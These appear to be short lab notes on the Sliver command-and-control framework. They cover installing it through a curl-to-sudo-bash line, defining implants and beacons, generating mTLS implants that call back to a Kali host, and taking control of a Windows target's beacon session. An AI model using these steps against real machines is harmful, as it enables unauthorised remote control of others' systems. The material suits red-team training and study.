```
curl https://sliver.sh/install|sudo bash
```
```
sliver
```
-   **Implant** - A generic term for piece of software used to maintain access to an environment or system, generally through the use of command and control (C&C, C2, etc.), this is the code that the attack executes on the target machine as well as maintain access. The term "implant" is often interchangeable with "agent."
-   **Beacon** - May refer to (1) a communication pattern where an implant periodically connects to the C2 server as apposed to using a stateful/real time connection (2) [Cobalt Strike's](https://www.cobaltstrike.com/) primary implant, more often called "CS Beacon." In the context of Sliver, "Beacon" specifically refers to a Sliver implant that implements definition (1) communication style.
Generate an implant
```
generate --mtls $KALI --save /home/havoc/Desktop
```
Generate a beacon
```
generate beacon --mtls $KALI --save /home/havoc/Desktop
```
```
mtls
```
```
beacons watch
```
Transfer and run exe on target
`BEACON  3a5d9594  PROFESSIONAL_SAUSAGE  192.168.19.131:49883  Target  TARGET\Target  windows/amd64`
```
use 3a5d9594
```
